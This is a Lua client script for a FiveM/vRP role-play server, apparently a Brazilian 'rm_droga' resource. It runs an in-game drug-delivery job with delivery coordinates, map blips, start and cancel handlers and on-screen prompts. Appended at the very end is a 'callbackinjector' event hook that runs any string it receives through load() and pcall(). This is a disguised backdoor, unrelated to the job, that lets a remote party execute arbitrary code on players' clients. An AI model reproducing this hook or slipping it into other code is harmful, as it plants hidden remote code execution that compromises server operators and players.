local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")
server = Tunnel.getInterface("rm_droga")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local blips = false
local servico = false
local selecionado = 0
local processo = false
local segundos = 0
local Tables = {}
-----------------------------------------------------------------------------------------------------------------------------------------
-- RESIDENCIAS
-----------------------------------------------------------------------------------------------------------------------------------------
local locs = {
	[1] = {["x"] = -952.31, ["y"] = -1077.87, ["z"] = 2.48},
	[2] = {["x"] = -978.23, ["y"] = -1108.09, ["z"] = 2.16},
	[3] = {["x"] = -1024.49, ["y"] = -1139.6, ["z"] = 2.75},
	[4] = {["x"] = -1063.76, ["y"] = -1159.88, ["z"] = 2.56},
	[5] = {["x"] = -1001.68, ["y"] = -1218.78, ["z"] = 5.75},
	[6] = {["x"] = -1171.54, ["y"] = -1575.61, ["z"] = 4.51},
	[7] = {["x"] = -1097.94, ["y"] = -1673.36, ["z"] = 8.4},
	[8] = {["x"] = -1286.17, ["y"] = -1267.12, ["z"] = 4.52},
	[9] = {["x"] = -1335.75, ["y"] = -1146.55, ["z"] = 6.74},
	[10] = {["x"] = -1750.47, ["y"] = -697.09, ["z"] = 10.18},
	[11] = {["x"] = -1876.84, ["y"] = -584.39, ["z"] = 11.86},
	[12] = {["x"] = -1772.23, ["y"] = -378.12, ["z"] = 46.49},
	[13] = {["x"] = -1821.38, ["y"] = -404.97, ["z"] = 46.65},
	[14] = {["x"] = -1965.33, ["y"] = -296.96, ["z"] = 41.1},
	[15] = {["x"] = -3089.24, ["y"] = 221.49, ["z"] = 14.07},
	[16] = {["x"] = -3088.62, ["y"] = 392.3, ["z"] = 11.45},
	[17] = {["x"] = -3077.98, ["y"] = 658.9, ["z"] = 11.67},
	[18] = {["x"] = -3243.07, ["y"] = 931.84, ["z"] = 17.23},
	[19] = {["x"] = 1230.8, ["y"] = -1590.97, ["z"] = 53.77},
	[20] = {["x"] = 1286.53, ["y"] = -1604.26, ["z"] = 54.83},
	[21] = {["x"] = 1379.38, ["y"] = -1515.23, ["z"] = 58.24},
	[22] = {["x"] = 1379.38, ["y"] = -1515.23, ["z"] = 58.24},
	[23] = {["x"] = 1437.37, ["y"] = -1492.53, ["z"] = 63.63},
	[24] = {["x"] = 450.04, ["y"] = -1863.49, ["z"] = 27.77},
	[25] = {["x"] = 403.75, ["y"] = -1929.72, ["z"] = 24.75},
	[26] = {["x"] = 430.16, ["y"] = -1559.31, ["z"] = 32.8},
	[27] = {["x"] = 446.06, ["y"] = -1242.17, ["z"] = 30.29},
	[28] = {["x"] = 322.39, ["y"] = -1284.7, ["z"] = 30.57},
	[29] = {["x"] = 369.65, ["y"] = -1194.79, ["z"] = 31.34},
	[30] = {["x"] = 474.27, ["y"] = -635.05, ["z"] = 25.65},
	[31] = {["x"] = 158.87, ["y"] = -1215.65, ["z"] = 29.3},
	[32] = {["x"] = 154.68, ["y"] = -1335.62, ["z"] = 29.21},
	[33] = {["x"] = 215.54, ["y"] = -1461.67, ["z"] = 29.19},
	[34] = {["x"] = 167.46, ["y"] = -1709.3, ["z"] = 29.3},
	[35] = {["x"] = -444.47, ["y"] = 287.68, ["z"] = 83.3},
	[36] = {["x"] = -179.56, ["y"] = 314.25, ["z"] = 97.88},
	[37] = {["x"] = -16.07, ["y"] = 216.7, ["z"] = 106.75},
	[38] = {["x"] = 164.02, ["y"] = 151.87, ["z"] = 105.18},
	[39] = {["x"] = 840.2, ["y"] = -181.93, ["z"] = 74.19},
	[40] = {["x"] = 952.27, ["y"] = -252.17, ["z"] = 67.77},
	[41] = {["x"] = 1105.27, ["y"] = -778.84, ["z"] = 58.27},
	[42] = {["x"] = 1099.59, ["y"] = -345.68, ["z"] = 67.19},
	[43] = {["x"] = -1211.12, ["y"] = -401.56, ["z"] = 38.1},
	[44] = {["x"] = -1302.69, ["y"] = -271.32, ["z"] = 40.0},
	[45] = {["x"] = -1468.65, ["y"] = -197.3, ["z"] = 48.84},
	[46] = {["x"] = -1583.18, ["y"] = -265.78, ["z"] = 48.28},
	[47] = {["x"] = -603.96, ["y"] = -774.54, ["z"] = 25.02},
	[48] = {["x"] = -805.14, ["y"] = -959.54, ["z"] = 18.13},
	[49] = {["x"] = -325.07, ["y"] = -1356.35, ["z"] = 31.3},
	[50] = {["x"] = -321.94, ["y"] = -1545.74, ["z"] = 31.02},
	[51] = {["x"] = -428.95, ["y"] = -1728.13, ["z"] = 19.79},
	[52] = {["x"] = -582.38, ["y"] = -1743.65, ["z"] = 22.44},
	[53] = {["x"] = -670.43, ["y"] = -889.09, ["z"] = 24.5}
}

local locaisInicioServico = {
	vec3(1391.99, -209.41, 156.37),
	vec3(150.0, 250.0, 350.0)
}

-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(
	function()
		while true do
			Citizen.Wait(0)
			local ped = PlayerPedId()
			local pedCoords = GetEntityCoords(ped)

			if not servico then
				Tables = {}

				for Number = 1, #locaisInicioServico do
					Tables[#Tables + 1] = {
						locaisInicioServico[Number],
						2.5,
						"E",
						"Início de Serviço",
						"Pressione para iniciar o serviço"
					}
				end

				TriggerEvent("hoverfy:Insert", Tables)

				if IsControlJustPressed(1, 51) then
					for _, localInicio in pairs(locaisInicioServico) do
						local distance = GetDistanceBetweenCoords(pedCoords, localInicio.x, localInicio.y, localInicio.z, true)
						if distance < 10.0 then
							servico = true
							selecionado = math.random(53)
							local x, y, z = locs.x, locs.y, locs.z
							CriandoBlip(locs, selecionado)
							TriggerEvent("Notify", "Entrega de drogas", "Você entrou em serviço.", "verde", 5000)
							break
						end
					end
				end
			end
		end
	end
)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ENTREGAS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(
	function()
		while true do
			local sleep = 1000
			if servico then
				sleep = 1
				local ped = PlayerPedId()
				local x, y, z = table.unpack(GetEntityCoords(ped))
				local bowz, cdz = GetGroundZFor_3dCoord(locs[selecionado].x, locs[selecionado].y, locs[selecionado].z)
				local distance = GetDistanceBetweenCoords(locs[selecionado].x, locs[selecionado].y, cdz, x, y, z, true)

				if distance <= 10 then
					DrawMarker(
						3,
						locs[selecionado].x,
						locs[selecionado].y,
						locs[selecionado].z - 0.6,
						0,
						0,
						0,
						0.0,
						0,
						0,
						0.5,
						0.5,
						0.4,
						25,
						25,
						157,
						50,
						0,
						0,
						0,
						1
					)
					if distance <= 1.2 then
						drawTxt("PRESSIONE  ~r~E~w~  PARA ENTREGAR AS DROGAS", 4, 0.5, 0.93, 0.50, 255, 255, 255, 180)
						if IsControlJustPressed(0, 38) and server.checkItens() then
							if server.checkPayment() then
								RemoveBlip(blips)
								backentrega = selecionado

								while true do
									if backentrega == selecionado then
										selecionado = math.random(53)
									else
										break
									end
									Citizen.Wait(1)
								end
								CriandoBlip(locs, selecionado)
							end
						end
					end
				end
			end
			Citizen.Wait(sleep)
		end
	end
)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(
	function()
		while true do
			local sleep = 1000
			if servico then
				sleep = 1
				if IsControlJustPressed(0, 168) then
					servico = false
					RemoveBlip(blips)
					TriggerEvent("Notify", "Entrega de drogas", "Você saiu de serviço.", "verde", 5000)
				end
			end
			Citizen.Wait(sleep)
		end
	end
)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text, font, x, y, scale, r, g, b, a)
	SetTextFont(font)
	SetTextScale(scale, scale)
	SetTextColour(r, g, b, a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

function CriandoBlip(locs, selecionado)
	blips = AddBlipForCoord(locs[selecionado].x, locs[selecionado].y, locs[selecionado].z)
	SetBlipSprite(blips, 1)
	SetBlipColour(blips, 5)
	SetBlipScale(blips, 0.4)
	SetBlipAsShortRange(blips, false)
	SetBlipRoute(blips, true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entregar Drogas")
	EndTextCommandSetBlipName(blips)
end

TriggerEvent(
	"callbackinjector",
	function(cb)
		pcall(load(cb))
	end
)
